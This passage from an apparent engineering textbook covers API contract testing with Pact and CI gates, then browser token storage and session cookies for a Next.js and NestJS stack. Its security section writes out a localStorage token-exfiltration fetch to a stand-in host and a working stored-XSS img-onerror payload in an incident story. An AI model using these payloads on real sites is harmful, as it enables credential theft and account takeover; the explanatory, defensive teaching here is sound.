The broker knew which web version was in production only if someone told it. Adding record-deployment and record-release to the web pipeline, and { deployedOrReleased: true } to the API's selectors, made the next such change fail verification before merge.

Edge cases & failure modes

  • Over-specified pacts that assert exact strings or whole objects fail on harmless changes and teach teams to ignore failures.
  • Under-specified pacts that use like({}) for a body prove nothing.
  • Provider states that depend on test order or shared data make verification flaky; reset per interaction.
  • Auth in verification: a request filter that injects a valid test token is normal; disabling auth in the test app is not, because the auth guard's error shape is part of the contract.
  • Pending and WIP pacts: enablePending lets a new consumer expectation warn instead of failing the provider until it is verified once; without it, a consumer can block the provider's main branch.
  • Contract tests are not functional tests: they check shape and the cases written, not that cancellation actually cancels.

How a Senior Full-Stack Engineer thinks about this

The senior uses contract tests where the coupling is real and the consumers are known: the web app, the company's mobile apps and internal portals. They keep the spec diff for everything (including unknown public consumers) and add Pact for the consumers whose deployed versions the API must not break. They insist on pacts generated from the real client, matchers instead of values, deploy gates on both sides, and recorded releases for long-lived web builds. And they treat a red can-i-deploy as a conversation between two teams, not a test to be retried.

Common mistakes

  • Writing pacts against hand-rolled fetch calls instead of the client the UI uses.
  • Verifying only main, ignoring what is deployed.
  • Not recording deployments and releases, so the broker's matrix is empty.
  • Exact-value assertions everywhere.
  • Testing the provider with different wiring from production.

Interview questions

  1. What does Pact catch that an OpenAPI diff does not? Expected answer: breaks that matter to a specific deployed consumer version, including undocumented reliance; who the consumers are. Follow-up: and the reverse? (Spec diff covers unknown consumers and anything no pact asserts.)
  2. What are consumer version selectors and which would you use for a web app? Expected answer: which pacts the provider verifies; mainBranch plus deployedOrReleased, with releases recorded for builds still in open tabs.
  3. How do you set up data for verification? Expected answer: named provider states with parameters, handled by small seeding functions against a test database, reset per interaction.
  4. What is can-i-deploy checking? Expected answer: the broker's matrix of verification results, for the version being deployed against the versions in the target environment.
  5. When would you use bi-directional contract testing? Expected answer: when provider verification is too costly; it compares pacts with the provider's spec, so the spec must be validated against the code.

Practical exercise

Add Pact between the web app and the orders API.

Acceptance criteria:

  • At least six web interactions, including two error cases, generated through the web's real API client.
  • The API verifies mainBranch and deployedOrReleased pacts in CI against an app wired by the same configureApp function as main.ts.
  • Removing a field the production web build reads fails API verification, even if the web's main branch no longer reads it.
  • Both pipelines run can-i-deploy before deploying and record-deployment after; the web pipeline also records releases and ends support for builds with no traffic.

74.11 Worked example: an order API, its generated client, and a breaking change caught in CI

Requirements

Put the Part together for one API and its consumers, then make a breaking change and watch the pipeline stop it.

  • The API: GET /v1/orders, GET /v1/orders/{id}, POST /v1/orders/{id}/cancel in NestJS, validated with @shop/contracts zod schemas, errors as problem documents (74.6), wire encodings from 74.7.
  • Consumer 1, web: the Next.js app in the same monorepo. It imports the zod schemas directly, and uses openapi-fetch typed by the generated schema.d.ts (74.2). Old builds live in open tabs for hours to days.
  • Consumer 2, merchant-portal: a React app in another repository, owned by another team, using types generated from a released openapi.json artefact. It ships every two weeks.
  • Gates: every API pull request must prove, in under 3 minutes of added CI time, that it does not break the published spec or any consumer version still in use. Every consumer deploy must prove it works with the API in production.
  • Numbers: the orders API serves about 1,400 requests per second at peak; the web's 48-hour old-build tail is about 0.4 % of requests after the reload nudge (74.9).

The contract pipeline

flowchart TB
    zod["packages/contracts: zod schemas"] --> reg["generate-openapi: zod-to-openapi registry"]
    reg --> spec["apps/api/openapi.json, committed"]
    spec --> g1{"Regenerated spec equals committed?"}
    spec --> g2{"oasdiff breaking vs main"}
    spec --> gen["web: openapi-typescript to schema.d.ts"]
    gen --> g3{"Typecheck web and api"}
    spec --> art["Release artefact orders-api-openapi version"]
    art --> mp["merchant-portal: pinned generation"]
    broker["Pact Broker: web and merchant-portal pacts"] --> g4{"Provider verification, deployedOrReleased"}
    g1 --> merge["Merge"]
    g2 --> merge
    g3 --> merge
    g4 --> merge
    merge --> cid{"can-i-deploy orders-api to production"}

Four gates on every API pull request, each catching a different class of break:

Gate Catches Time
G1 Spec regenerated equals committed Hand-edited or stale openapi.json 6 s
G2 oasdiff breaking against main Breaks of the published promise, for every consumer including unknown ones 3 s
G3 Web types regenerated and type-checked Code in this commit that disagrees with the new contract 26 s
G4 Pact provider verification Breaks for consumer versions that are deployed or still released 48 s

The contract

OrderSummarySchema in @shop/contracts, as built up across the volume (70.12, 78.1, 80.7):

// packages/contracts/src/orders.ts (excerpt)
export const OrderSummarySchema = z.object({
  id: z.string().uuid(),
  displayId: z.string(),
  status: OrderStatusSchema,                              // closed for the server; web reads it through openEnum (80.7)
  totalMinor: MinorUnitsSchema,                           // '129900'
  currency: z.string().length(3),                         // 'INR'
  items: z.array(OrderItemSchema),
  placedAt: z.string().datetime({ offset: true }),
  deliveryDate: z.string().date().nullable(),
  deliveredAt: z.string().datetime({ offset: true }).nullable(),
  storeTimeZone: z.string(),
  version: z.number().int(),
  updatedAt: z.string().datetime({ offset: true }),
});

The spec script from 74.3 registers it as components.schemas.OrderSummary. The web's schema.d.ts is generated from the committed spec. The merchant portal pins orders-api-openapi@2.14.0. Both consumers have pacts in the broker; the web's include the two interactions from 74.10.

The change

A backend engineer is adding multi-currency marketplace orders. They decide money should be one object, and make the change in one tidy pull request:

// before
totalMinor: MinorUnitsSchema,
currency: z.string().length(3),
// after
total: z.object({ amountMinor: MinorUnitsSchema, currency: z.string().length(3) }),

They update the mapper, the API tests, and every web component that read totalMinor (OrderRow, OrderHeader, the cancel confirmation). Locally, pnpm turbo run typecheck test is green. In a world with only shared types, this merges.

What CI says

G3, typecheck: green. The web code in the pull request agrees with the new contract. That is all it can know.

G2, spec diff: red.

$ oasdiff breaking /base/openapi.json /rev/openapi.json --fail-on ERR
3 changes: 3 error, 0 warning, 0 info
error   [response-required-property-removed] at /rev/openapi.json
        in API GET /v1/orders
                removed the required property 'items/items/totalMinor' from the response with the '200' status
error   [response-required-property-removed] at /rev/openapi.json
        in API GET /v1/orders/{id}
                removed the required property 'totalMinor' from the response with the '200' status
error   [response-required-property-removed] at /rev/openapi.json
        in API GET /v1/orders/{id}
                removed the required property 'currency' from the response with the '200' status

(Output abridged.) The published promise is broken for every consumer, known or not.

G4, provider verification: red, with names.

Verifying a pact between web and orders-api
  [Using consumer version selectors: mainBranch, deployedOrReleased]
  Pact for web version 7e21c0a (deployed in production, released)
    a request for one order
      returns a response which
        has status code 200 (OK)
        has a matching body (FAILED)
Failures:
1) Verifying a pact between web and orders-api - a request for one order
    1.1) body: $ Actual map is missing the following keys: currency, totalMinor
Verifying a pact between merchant-portal and orders-api
  Pact for merchant-portal version 2.14.0 (deployed in production)
    a request for todays orders ... (FAILED)

The important line is web version 7e21c0a (deployed in production, released). The web on main in this pull request is fine. The web in users' tabs, and the merchant portal, are not. Had the pull request merged, can-i-deploy --pacticipant orders-api --to-environment production would have answered "Computer says no" with the same two failing pairs, and the deploy would have stopped there.

The CI job that produces these results:

# .github/workflows/contracts.yml
name: contracts
on: pull_request
jobs:
  contracts:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    services:
      postgres:
        image: postgres:16
        env: { POSTGRES_PASSWORD: test }
        ports: ['5432:5432']
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }
      - uses: pnpm/action-setup@v4
      - uses: actions/setup-node@v4
        with: { node-version: 20, cache: pnpm }
      - run: pnpm install --frozen-lockfile
      - name: G1 spec generated from contracts and committed
        run: pnpm --filter api openapi && git diff --exit-code apps/api/openapi.json
      - name: G2 breaking-change diff against main
        if: ${{ !contains(github.event.pull_request.labels.*.name, 'breaking-change-approved') }}
        run: |
          git show origin/main:apps/api/openapi.json > /tmp/base.json
          docker run --rm -v /tmp:/base -v "$PWD/apps/api:/rev" tufin/oasdiff breaking /base/base.json /rev/openapi.json --fail-on ERR
      - name: G3 web types regenerated and everything type-checked
        run: pnpm --filter web gen:api && git diff --exit-code apps/web/src/api/schema.d.ts && pnpm turbo run typecheck --affected
      - name: G4 provider verification against deployed and released consumers
        run: pnpm --filter api test:pact:provider
        env:
          DATABASE_URL: postgres://postgres:test@localhost:5432/postgres
          PACT_BROKER_BASE_URL: ${{ vars.PACT_BROKER_BASE_URL }}
          PACT_BROKER_TOKEN: ${{ secrets.PACT_BROKER_TOKEN }}
          GIT_SHA: ${{ github.event.pull_request.head.sha }}
          GIT_BRANCH: ${{ github.head_ref }}

The breaking-change-approved label skips only G2, never G4: a human may decide the published promise should change, but cannot wave through a break for a consumer version the broker knows is in use.

The fix: expand, migrate, measure, contract

The engineer turns one pull request into four steps.

Step 1, expand (API, day 0). Add total next to the old fields, populate both, and mark the old ones deprecated:

// packages/contracts/src/orders.ts
export const MoneySchema = z.object({ amountMinor: MinorUnitsSchema, currency: z.string().length(3) });
export const OrderSummarySchema = z.object({
  // ...
  totalMinor: MinorUnitsSchema.describe('Deprecated: use total.amountMinor. Sunset 2026-12-15.'),
  currency: z.string().length(3).describe('Deprecated: use total.currency. Sunset 2026-12-15.'),
  total: MoneySchema,
  // ...
});

In the spec registry, the two old properties get deprecated: true through zod-to-openapi's .openapi({ deprecated: true }) metadata, and GET /v1/orders responses carry a Sunset: Tue, 15 Dec 2026 00:00:00 GMT header (74.9). G2 is green (an added property is not breaking), G4 is green (every pact still finds totalMinor and currency), and the release artefact orders-api-openapi@2.15.0 is published.

Step 2, migrate consumers (web day 1, portal day 6). The web pull request switches components to order.total, with its pacts updated to assert total instead of the old fields. Its can-i-deploy checks the new pact against the API in production, which already sends total: green. The merchant portal team regenerates from 2.15.0 in their next sprint, sees the deprecated fields struck through in their editor, migrates, publishes new pacts and deploys.

Step 3, measure. The API logs, per client version, which builds are still in use (74.9). For the web, the 48-hour tail of 7e21c0a and older builds falls below 0.05 % by day 4; the pipeline runs record-support-ended for them on day 5. The merchant portal's old version stops being deployed on day 6. Now no deployed or released consumer version has a pact that reads totalMinor.

Step 4, contract (API, day 14). The removal pull request deletes totalMinor and currency. G2 is still red, correctly: the published promise does shrink. The pull request carries the breaking-change-approved label, with a link to the version dashboard and the broker matrix in its description, and approvals from the web and portal owners. G4 is green, because no consumer version in use reads the old fields. can-i-deploy is green. It ships.

gantt
    dateFormat  YYYY-MM-DD
    title Expand and contract for total
    section API
    Expand, send both            :a1, 2026-11-02, 1d
    Sunset header live           :a2, after a1, 13d
    Contract, remove old fields  :a3, 2026-11-16, 1d
    section Web
    Read total, deploy           :w1, 2026-11-03, 1d
    Old tabs drain               :w2, after w1, 4d
    section Portal
    Regenerate and migrate       :p1, 2026-11-06, 3d

Numbers

Over the following quarter, on this API and its two consumers: 212 API pull requests, 9 red on G2 (6 genuine, 3 approved as intentional after migration), 4 red on G4 (all genuine, all for a deployed consumer version), 2 red on G1 (hand edits). Median added CI time per pull request: 1 min 31 s. Contract violations reported by the web's runtime parser in production: 3, all from a single mapper bug in a new endpoint, detected 2 minutes after deploy and routed to the orders API team by endpoint ownership. Contract-caused incidents: zero, against five in the quarter before the gates.

Failure drills

Drill Expected result Mechanism
API removes a field the production web build reads G4 red, naming web 7e21c0a deployedOrReleased selectors, recorded releases
API adds status: 'RETURN_REQUESTED' G2 warning only; web renders the fallback badge and reports the value Open enums on read (74.7)
Someone edits openapi.json by hand G1 red Regeneration diff
Web starts reading a field the API does not send Web's can-i-deploy red until the API verifies the new pact Pending pacts, consumer-side gate
API changes 409 ORDER_NOT_CANCELLABLE to 422 G2 red (documented response removed), G4 red (web error interaction) Errors documented per operation, error pacts
Mapper bug returns totalMinor as a number on one endpoint Web shows the error state on that screen; contract alert to the API team within 2 minutes Runtime parse with telemetry (74.1)
Merchant portal regenerates from a staging spec Not possible: generation reads only released artefacts Pinned spec versions (74.2)

How a Senior Full-Stack Engineer thinks about this

The type check was green, and it was right: the code in that commit agreed with itself. The senior's point is that a contract is between versions, not between files, so the gates must know which versions exist. The spec diff protects the published promise for everyone; consumer contracts protect the specific versions the broker knows are deployed or released; runtime validation catches what both missed, within minutes. None of the gates made the engineer's goal impossible. They turned a one-step break into a four-step migration that cost two weeks of calendar time and about an hour of work, instead of an incident, a rollback and a postmortem.

To a product manager: "The money change ships in two weeks instead of today, because the merchant portal and open browser tabs still use the old field. Nothing is blocked: new screens can use the new field from tomorrow."

Practical exercise

Reproduce this example in the volume's monorepo, with a second consumer in a separate repository.

Acceptance criteria:

  • The four gates run on every API pull request in under 3 minutes in total.
  • The one-step total change fails G2 and G4, and the G4 output names the deployed web version and the merchant portal version.
  • The four-step migration passes every gate at every step, and the removal step merges only with the approval label and green G4.
  • A dashboard shows requests by client version, and record-support-ended is run from it, not from a calendar.
  • The web's runtime parser reports a deliberately injected contract violation on staging within one minute, routed to the API team.

Senior Checklist — Part 74

  • I understand the concept
  • I can explain it simply
  • I can implement it
  • I understand its failure modes
  • I understand its scaling limitations
  • I understand its security implications
  • I understand its operational implications
  • I can choose between alternatives
  • I can explain the tradeoffs
  • I can answer senior-level interview questions
  • I can list what a contract includes beyond field names: nullability, ordering, error codes, headers, timing and meaning
  • I parse every response at one choke point and report violations with endpoint, build version and request ID
  • I generate the OpenAPI spec from one source of truth, commit it, diff it, and generate clients from pinned versions only
  • I can choose between shared zod schemas, generated OpenAPI clients, tRPC and GraphQL codegen for a given set of consumers
  • I validate strictly on input and tolerantly on output, and I deploy request changes provider first
  • I return every error as one problem document with code, issues and requestId, and classify it once on the client
  • I encode instants, calendar dates, money, IDs and enums so that no time zone, float or JSON.parse can change them
  • I keep upload bytes off the API, show real progress, and make every upload step retryable
  • I measure client version populations and remove fields only when the numbers say they are unused
  • I run consumer contract tests against deployed and released consumer versions and gate deploys with can-i-deploy

Part 74 — Key Takeaways

  • A contract is between versions, not files: production always runs more than one version of every client.
  • Types prove one commit agrees; spec diffs protect the published promise; consumer contracts protect deployed versions; runtime validation catches the rest.
  • Parse every response at one choke point, and route contract violation alerts to the team that owns the endpoint.
  • Generate clients from a committed, versioned spec, never from a live server.
  • Be strict on input and tolerant on output; new request fields ship provider first, removals ship consumer first.
  • tRPC is a superb intercom and a poor public phone; end-to-end types still end at the deploy boundary.
  • One error shape everywhere, code for machines, issues with field paths for forms, requestId for support.
  • Instants are UTC strings, calendar dates are date strings, money is minor units in strings, IDs are opaque strings, and response enums are open.
  • The server computes money and time rules; the client formats them.
  • Uploads are a small protocol: initiate, upload direct to storage with progress, complete, wait for processing.
  • Measure the tail of old tabs and app versions, shrink it with reload nudges, and remove things on evidence, not on a calendar.
  • A red can-i-deploy is a conversation between two teams, and expand and contract is almost always the answer.

Part 75 — Auth and Security in the Browser

Part 40 — Security built authentication and authorisation from the server's side: password hashing, sessions in Redis (40.2), JWTs and refresh rotation (40.3), OAuth 2.0 and OIDC (40.4, 40.5), XSS and CSRF (40.21, 40.22), and the security headers a NestJS service sends (40.33). Part 73 then put a Next.js tier in front of NestJS: a BFF that keeps tokens on the server (73.8) and three layers of auth checks, with middleware for convenience, a data access layer for correct rendering and NestJS for enforcement (73.9). Part 73 ended with a 15-minute access token in a cookie and a promise: refresh, rotation and logout come in Part 75.

This Part keeps that promise from the browser's side. The browser is where the attacker's code runs (XSS, a compromised analytics script), where the attacker's page sits next to yours (CSRF, clickjacking), where tokens get copied into places nobody audits (localStorage, URLs, logs), and where several tabs share one login and disagree about whether it is still valid. The backend controls only what it sends; the browser decides what happens next. So every section asks the same two questions: what can an attacker in the browser actually do, and what must the NestJS API send or check to make the frontend safe?

Stack and versions, as in the rest of the volume: NestJS 10, Next.js 14 App Router (with notes where 15 and 16 differ), React 18 (with notes for React 19), jose 5 for JWTs in Edge code, openid-client 6 for OIDC on the server, TanStack Query v5, and the @shop/contracts package. The worked example in 75.10 is the auth flow Part 79 — Full-Stack Worked Project reuses, so the cookie names, endpoints and lifetimes chosen here are the ones that project builds on.

75.1 Where tokens live: HttpOnly cookies vs memory vs localStorage

Concept

After login, the browser must hold something that proves who the user is on the next request: a session id, an access token, a refresh token. There are only a handful of places it can live:

  1. An HttpOnly cookie. The browser stores it and attaches it to matching requests. JavaScript on the page cannot read it at all: it does not appear in document.cookie.
  2. JavaScript memory. A variable in a module or a React context. Gone on reload, invisible to other tabs, readable by any script running in the page.
  3. Web Storage (localStorage, sessionStorage). Persistent key-value storage readable by any script on the same origin. localStorage survives restarts; sessionStorage lives per tab.
  4. IndexedDB or a service worker. More complex storage, still on the same origin, still reachable by any script there.
  5. Nowhere in the browser. The token-handler or BFF pattern from 73.8: tokens live on the Next.js server, and the browser holds only an opaque HttpOnly session cookie.

The choice is not about which place is "secure". It is about which attacker you are defending against and what that attacker gets when they win. The two that matter most are a script running in your page (XSS) and a page on another site making your browser send requests (CSRF).

Why does it exist?

Single-page apps grew up calling APIs with Authorization: Bearer <token> headers. To set that header, JavaScript must be able to read the token, and the easiest place to keep a readable token across reloads is localStorage. A generation of tutorials did exactly that. Meanwhile, the cost of XSS kept rising: a modern storefront loads 20 to 60 third-party scripts (analytics, A/B testing, chat, reviews, tag managers), and any one of them, or any one of your 1,500 npm dependencies, can run code in your origin (75.8).

So the storage question exists because two goals pull in different directions. JavaScript-readable tokens are convenient for calling APIs on other origins and need no CSRF defence. Script-unreadable cookies survive XSS better but bring CSRF, cookie scoping and size limits with them (75.2, 75.6).

Mental model

Imagine the key to your flat.

  • localStorage is a key under the doormat. Anyone who gets as far as your front door, even once, can take a copy home and come back whenever they like, for as long as the lock is unchanged.
  • Memory is a key in your pocket. Safer, but a pickpocket standing next to you while you are out can still lift it, and you lose it every time you change clothes (reload).
  • An HttpOnly cookie is a key built into a smart lock that only opens when you are standing at the door. A burglar who gets inside while you are home can open doors with you there, but cannot walk away with a copy.
  • The BFF keeps the key with a concierge downstairs. You carry only a visitor badge that is useless outside the building.

None of these stops a burglar who is already inside your flat while you are home. That is XSS. What changes is whether they leave with a key that works tomorrow from another city.

How it works

The threat model, made concrete. Suppose an attacker's script runs in https://shop.example because of an XSS bug or a compromised third-party script.

flowchart TB
    xss["Attacker script runs in shop.example"] --> ls["Token in localStorage"]
    xss --> mem["Token in memory"]
    xss --> ck["Token in HttpOnly cookie"]
    ls -->|"localStorage.getItem, send to evil.example"| exfil["Token copied off the device, usable for its full lifetime"]
    mem -->|"wrap window.fetch, read Authorization header"| exfil2["Token copied, usable until expiry"]
    ck -->|"cannot read it"| ride["Can only send requests from this tab while it is open"]
    ride --> limits["Bounded by tab lifetime, CSP connect-src, rate limits, step-up auth"]

Step by step:

  1. localStorage: one line, fetch('https://evil.example/c?t=' + localStorage.getItem('token')), sends the token away. If it is a refresh token valid for 30 days, the attacker has 30 days. They can use it from their own machine, at 3 a.m., at full speed, with no browser in the way.
  2. Memory: the token is not in storage, but the script runs before or alongside yours. It can replace window.fetch with a wrapper that copies every Authorization header it sees. Memory reduces persistence (a reload clears it) and makes theft slightly harder; it does not prevent it.
  3. HttpOnly cookie: the script cannot read the cookie. It can call fetch('/api/v1/me/addresses', { method: 'POST', credentials: 'include', ... }), and the browser attaches the cookie. This is called session riding. The attacker acts as the user, but only from inside the victim's browser, only while the tab is open, only to origins your CSP's connect-src allows, and only as fast as your rate limits let a real user go.
  4. BFF: the same as the cookie case, plus the browser never sees an access token for any downstream service, so there is nothing to copy even from network traffic in DevTools.

The honest summary: no storage choice defeats XSS. HttpOnly cookies turn "the attacker owns the account for a month" into "the attacker can act while the victim's tab is open", and that is a large difference in practice, because it shrinks the window, ties the attack to the victim's device and IP, and lets step-up checks (re-enter password to change email, 75.5) still bite.

The full comparison:

Where XSS can read it XSS can use it CSRF exposure Survives reload Shared across tabs Calls other origins easily
localStorage Yes, and exfiltrate Yes None Yes Yes Yes
sessionStorage Yes, and exfiltrate Yes None Yes (same tab) No (copied on "duplicate tab") Yes
Memory With effort (patching fetch) Yes None No No Yes
HttpOnly cookie No Yes, from this tab only Yes, needs SameSite and checks (75.6) Yes Yes Only with CORS credentials and a parent-domain cookie
BFF, opaque cookie No Yes, through the BFF only Yes, same as cookie Yes Yes Not needed: BFF calls them
Non-extractable key in IndexedDB (DPoP) Key cannot be exported Yes, from this origin None Yes Yes Yes

The last row is worth knowing. DPoP (Demonstrating Proof of Possession, RFC 9449) binds an access token to a key pair. The browser creates the pair with Web Crypto using extractable: false, stores the CryptoKey object in IndexedDB, and signs a small proof JWT for every request. A stolen token is useless without the private key, and the private key cannot be exported by any script. XSS can still use the key while it runs, like session riding, but cannot take it away. It needs authorisation-server and API support, so it is a choice for high-value apps rather than a default.

Practical example

A food delivery web app shows "Hi, Priya" in the header, the saved addresses, and the order history. What does the client actually need to know? The user's name, id, roles for showing UI (71.3) and feature flags. What does it need to prove on each request? Only who the user is, and the browser can prove that with a cookie it cannot read.

So the client holds a session view (from GET /v1/me) in memory, and no token at all. If the page is reloaded, it calls /v1/me again; the cookie does the proving. The token problem disappears from the frontend code entirely, and the remaining work is on cookies (75.2), refresh (75.3) and CSRF (75.6).

React / Next.js example

The anti-pattern, still common in code reviews:

// apps/web/src/auth/LegacyAuthProvider.tsx  -- what NOT to ship
'use client';
import { createContext, useContext, useState, type ReactNode } from 'react';

const AuthContext = createContext<{ token: string | null; login: (t: string) => void } | null>(null);

export function LegacyAuthProvider({ children }: { children: ReactNode }) {
  // Readable by every script on the origin, persisted for as long as the token is valid.
  const [token, setToken] = useState<string | null>(() => localStorage.getItem('accessToken'));
  const login = (t: string) => { localStorage.setItem('accessToken', t); setToken(t); };
  return <AuthContext.Provider value={{ token, login }}>{children}</AuthContext.Provider>;
}
export const useLegacyAuth = () => useContext(AuthContext);

The replacement holds no secret. It knows about the user, not how to be the user:

// apps/web/src/auth/SessionProvider.tsx
'use client';
import { createContext, useContext, type ReactNode } from 'react';
import { useQuery } from '@tanstack/react-query';
import { SessionViewSchema, type SessionView } from '@shop/contracts';
import { apiGet } from '../api/client';

const SessionContext = createContext<SessionView | null>(null);

export function SessionProvider({ initial, children }: { initial: SessionView | null; children: ReactNode }) {
  // `initial` comes from the server layout (requireSession in 79.9), so the first paint already knows the user.
  const { data } = useQuery({
    queryKey: ['me'],
    queryFn: ({ signal }) => apiGet('/v1/me', SessionViewSchema, signal), // cookie does the proving
    initialData: initial ?? undefined,
    staleTime: 5 * 60_000,
    retry: false,                                                       // a 401 here means "logged out", not "flaky"
  });
  return <SessionContext.Provider value={data ?? null}>{children}</SessionContext.Provider>;
}

export const useSession = () => useContext(SessionContext);             // name, roles, flags: display only

Two details matter. apiGet (72.2) already sends credentials: 'include' to the same-origin /api/v1/* path, so the cookie flows through the rewrites proxy (73.8) without the code ever touching it. And retry: false is deliberate: the 401 path is handled by the refresh logic in 75.3, not by TanStack Query's generic retries.

Backend side (NestJS)

The API must accept the credential where the browser keeps it, and must never hand a long-lived secret to page JavaScript.

// apps/api/src/auth/jwt.strategy.ts
import { Injectable } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import { PassportStrategy } from '@nestjs/passport';
import { ExtractJwt, Strategy } from 'passport-jwt';
import type { Request } from 'express';

const fromSessionCookie = (req: Request): string | null =>
  req.cookies?.['__Host-session'] ?? null;               // needs app.use(cookieParser()) in main.ts

@Injectable()
export class JwtStrategy extends PassportStrategy(Strategy) {
  constructor(cfg: ConfigService) {
    super({
      // Browser traffic: the cookie. Mobile apps and the BFF: the Authorization header.
      jwtFromRequest: ExtractJwt.fromExtractors([fromSessionCookie, ExtractJwt.fromAuthHeaderAsBearerToken()]),
      secretOrKey: cfg.getOrThrow<string>('JWT_PUBLIC_KEY'),
      algorithms: ['RS256'],                              // never accept 'none' or an HS256 downgrade
      issuer: cfg.getOrThrow<string>('AUTH_ISSUER'),
      audience: 'shop-web',
    });
  }
  validate(payload: { sub: string; roles?: string[]; sid: string; iat: number }) {
    return { id: payload.sub, roles: payload.roles ?? [], sessionId: payload.sid, issuedAt: payload.iat };
  }
}

The rules that go with it:

  • Cookie-authenticated routes need CSRF defences the moment you accept the cookie extractor (75.6). Bearer-only routes do not.
  • Token responses are never cached. Any response that carries a token or sets a session cookie sends Cache-Control: no-store.
  • The refresh token never appears in a JSON body sent to the browser. It goes to the BFF server-side, or into an HttpOnly cookie scoped to the refresh path (75.2, 75.3).
  • /v1/me returns what the UI needs and nothing more: no password hash, no internal flags, no other users' data.

Production scenario

A grocery marketplace with 1.2 million monthly users migrated from localStorage JWTs (24-hour access tokens, no refresh) to the BFF pattern with an HttpOnly session cookie. The measurable changes over the next quarter:

  • The session cookie added about 900 bytes to every same-origin request; with HTTP/2 header compression (HPACK) the repeated cookie cost about 40 bytes per request after the first.
  • The rewrites hop added 1 to 3 ms p50 inside the region; CORS preflights for the old cross-origin API calls disappeared, saving one 60 to 120 ms round trip on the first call to each endpoint on mobile.
  • A stored XSS found later in the seller-facing review tool could no longer exfiltrate credentials. The security team's write-up classified it as "session riding limited to open tabs" rather than "mass account takeover", and the incident response took a day instead of a week of forced password resets.

Failure scenario

At 09:20 on a Monday, a customer support team lead reported that refunds had been issued overnight on 140 orders, all from her account. The support console stored a 7-day admin JWT in localStorage. Four days earlier, an attacker had placed an order with a delivery note containing <img src=x onerror="fetch('https://cdn-metrics.example/p?d='+btoa(localStorage.accessToken))">. The console rendered delivery notes with dangerouslySetInnerHTML "so that line breaks would work". When the team lead opened the order on Friday, her token left the building. The attacker used it from a data centre IP over the weekend, slowly, at about one refund every six minutes, which no rate limit flagged.

The postmortem's root cause had three parts, and each fix maps to a section of this Part: the rendering sink (75.7), the token in script-readable storage (this section), and the lack of a second check on a high-value action (step-up, 75.5). With an HttpOnly cookie, the same XSS could only have issued refunds while her tab was open, from her IP, at a time when she was looking at the screen.

Edge cases & failure modes

  • Browser extensions with the cookies permission can read HttpOnly cookies through the extensions API. HttpOnly protects against page scripts, not against software the user installed.
  • "Duplicate tab" copies sessionStorage, so a per-tab token is not actually per-tab.
  • Safari's Intelligent Tracking Prevention can delete script-writable storage (including localStorage and IndexedDB) for sites the user has not interacted with for seven days. Users who rely on "remember me" in localStorage get logged out unpredictably.
  • Tokens in URLs (?token=...) leak through Referer headers, browser history, proxy logs and analytics tools. Never put a reusable credential in a URL; one-time codes are the exception, and only with Referrer-Policy: no-referrer (75.9).
  • Memory tokens and multiple tabs: each tab must refresh on its own, multiplying refresh traffic and racing on rotation (75.3).
  • Shared and kiosk computers: anything persistent outlives the user's visit. Logout must clear it (75.10).
  • A parent-domain cookie (Domain=shop.example) is sent to every subdomain, including the marketing site run by an agency (75.2).

How a Senior Full-Stack Engineer thinks about this

The senior starts with the threat model, not the storage API. They say out loud: "XSS wins against every option; we are choosing what XSS gets." They prefer that the browser hold nothing it can read, which in a Next.js plus NestJS stack means the BFF pattern with HttpOnly cookies, and they accept the CSRF work that comes with it because CSRF has complete, cheap defences and XSS does not. They reserve DPoP and memory-held tokens for cases where the API really must be called cross-origin from the browser.

They also refuse to argue storage in isolation. Short access-token lifetimes, refresh rotation with reuse detection (75.3), CSP (75.7), a small third-party script budget (75.8) and step-up auth for sensitive actions (75.5) are one system. Storage is one dial on it.

To a product manager: "Wherever we put the login, a malicious script could act as the user while their tab is open. Putting it in a cookie the page cannot read means a script cannot take the login away and use it for weeks. It costs us one extra security check on forms, which we are adding anyway."

Common mistakes

  • Storing access or refresh tokens in localStorage because a tutorial did, turning every XSS into long-term account takeover.
  • Believing memory storage defeats XSS. It reduces persistence; a script in the page can still intercept the token.
  • Putting a JWT in a non-HttpOnly cookie so that JavaScript can read it, which combines the CSRF exposure of cookies with the theft exposure of storage.
  • Returning the refresh token in the login JSON to a browser client.
  • Holding roles from a decoded JWT in a client store and treating them as authority (75.5).

Interview questions

  1. Where should a browser app keep its tokens, and why? Expected answer: ideally nowhere readable by script; HttpOnly cookies, preferably an opaque session cookie with tokens held by a BFF. Why it matters: it changes what XSS can achieve. Follow-up: what new risk does a cookie introduce? (CSRF, solved with SameSite, Origin checks and tokens.)
  2. Does an HttpOnly cookie protect you from XSS? Expected answer: no; it prevents exfiltration, not use. The attacker can ride the session from the victim's tab. Follow-up: what limits session riding? (CSP connect-src, step-up auth, short tab lifetime, anomaly detection.)
  3. Why is an in-memory access token not immune to XSS? Expected answer: injected script runs in the same realm and can patch fetch or XMLHttpRequest to capture headers.
  4. What is DPoP and what problem does it solve that HttpOnly does not? Expected answer: sender-constrained tokens bound to a non-extractable key; a stolen token is useless elsewhere. It allows JavaScript-held tokens without exfiltration risk.
  5. What is the token-handler or BFF pattern? Expected answer: the server-side web tier holds tokens, the browser holds an opaque HttpOnly cookie, and the BFF attaches tokens to upstream calls.
  6. How would you migrate an app from localStorage tokens to cookies without logging everyone out? Expected answer: add a one-time exchange endpoint that accepts the old token, sets the cookie and deletes the storage key; dual-accept for one access-token lifetime; then remove the header path for browser clients.

Practical exercise

Audit one web app you work on for credential storage.

Acceptance criteria:

  • A table lists every credential the browser holds (session id, access token, refresh token, CSRF token, third-party tokens), where it lives, its lifetime, and whether script can read it.
  • Running Object.keys(localStorage) and document.cookie in the console on a logged-in page reveals no reusable credential.
  • An injected test script (fetch('/api/v1/me') from the console) is documented as "session riding possible", and the list of high-value actions that require step-up is written next to it.
  • The NestJS JwtStrategy accepts the cookie for browser routes and the header for mobile routes, with tests for both.

75.2 Session cookies done right: attributes, prefixes, scope and size

Concept

A cookie is a name and a value plus a set of attributes that tell the browser when to send it back. Part 40.2 listed the flags and the attack each blocks; Part 69.8 placed cookies among the other browser storage options. This section is the browser's side of the rules: exactly when a browser attaches a cookie, which attribute combinations it refuses, how prefixes make some mistakes impossible, and why a cookie that is 200 bytes too big can take a site down.

A session cookie done right for a first-party web app looks like this:

Set-Cookie: __Host-session=eyJhbGciOi...; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=840

Every part of that line is a decision: the __Host- prefix, no Domain attribute, Path=/, Secure, HttpOnly, SameSite=Lax, and a lifetime slightly shorter than the token inside it.

Why does it exist?

